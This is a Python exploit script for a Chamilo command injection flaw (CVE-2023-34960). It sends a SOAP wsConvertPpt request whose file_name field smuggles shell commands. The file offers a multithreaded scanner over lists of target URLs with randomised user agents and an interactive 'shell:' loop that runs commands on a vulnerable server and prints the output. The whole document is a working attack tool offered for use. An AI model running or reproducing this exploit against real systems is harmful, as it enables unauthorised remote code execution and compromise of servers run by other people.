import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random
import xml.etree.ElementTree as ET

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua


proxies={'http': 'http://127.0.0.1:8080',
		'https': 'https://127.0.0.1:8080'}

def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc + '/main/webservices/additional_webservices.php'
	cmd = 'COMMAND HERE'
	data = '''<?xml version="1.0" encoding="UTF-8"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(url, cmd)
	try:
		headers = {'User-Agent': get_ua(),
		'Content-Type': 'text/xml; charset=utf-8'}
		res = requests.post(url1,headers=headers,data=data,timeout=10,verify=False)
		if res.status_code == 200 and "wsConvertPptResponse" in res.text:
			print("\033[32m[+]{} is vulnerable.\033[0m".format(url1))
			# if "xsd:string" in res.text:
			# 	rsp_command=re.findall(r'xsd:string">(.*?)"',res.text)[0]
			# 	print(rsp_command)			
			return 1
		else:
			print("\033[31m[-]{} is no vulnerable\033[0m".format(url1))
	except Exception as e:
		print ("[!]{} is timeout\033[0m".format(url1))

#cmdshell
def cmdshell(url):
	if check_vuln(url) == 1:
		url = parse.urlparse(url)
		url1 = url.scheme + '://' + url.netloc + '/main/webservices/additional_webservices.php'
		while 1:
			cmd = input("\033[35mshell: \033[0m")
			if cmd =="exit":
				sys.exit(0)
			else:
				headers = {'User-Agent': get_ua(),
							'Content-Type': 'text/xml; charset=utf-8'
				}
				data = '''<?xml version="1.0" encoding="UTF-8"?>
    <SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:ns1="{}" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-soap" xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><ns1:wsConvertPpt><param0 xsi:type="ns2:Map"><item><key xsi:type="xsd:string">file_data</key><value xsi:type="xsd:string"></value></item><item><key xsi:type="xsd:string">file_name</key><value xsi:type="xsd:string">`{{}}`.pptx'|" |{}||a #</value></item><item><key xsi:type="xsd:string">service_ppt2lp_size</key><value xsi:type="xsd:string">720x540</value></item></param0></ns1:wsConvertPpt></SOAP-ENV:Body></SOAP-ENV:Envelope>'''.format(url, cmd)
				try:
					res = requests.post(url1,data=data,headers=headers,timeout=10,verify=False)
					rsp_command=ET.fromstring(res.text).find('.//return')
					if rsp_command is not None:
						rsptext = rsp_command.text
						print("\033[32m{}\033[0m".format(rsptext))
					else:
						print("\033[31m[-]{} request flase!\033[0m".format(url1))

				except Exception as e:
					print("\033[31m[-]{} is timeout!\033[0m".format(url1))

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':

	print("\nChamilo_CVE-2023-34960 scan by when\n")

	arg=ArgumentParser(description='check_url By when')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python3 CVE-2023-34960.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:python3 CVE-2023-34960.py -furl.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:python3 CVE-2023-34960.py -c http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
	if url != None and cmd == None and filename == None:
		check_vuln(url)
	elif url == None and cmd == None and filename != None:
		start=time()
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
		end=time()
		print('任务完成，用时{}'.format(end-start))
	elif url == None and cmd != None and filename == None:
		cmdshell(cmd)

